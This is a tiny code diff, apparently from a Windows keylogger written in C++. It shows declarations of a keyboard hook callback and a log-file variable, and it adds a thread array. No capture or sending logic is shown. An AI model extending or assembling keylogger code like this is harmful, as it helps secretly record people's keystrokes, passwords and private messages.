@@ -7,6 +7,7 @@
 
 LRESULT WINAPI hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam);
 std::string keylogger_file;
+THREAD threads[MAXTHREADS];
 
 using namespace std;
 
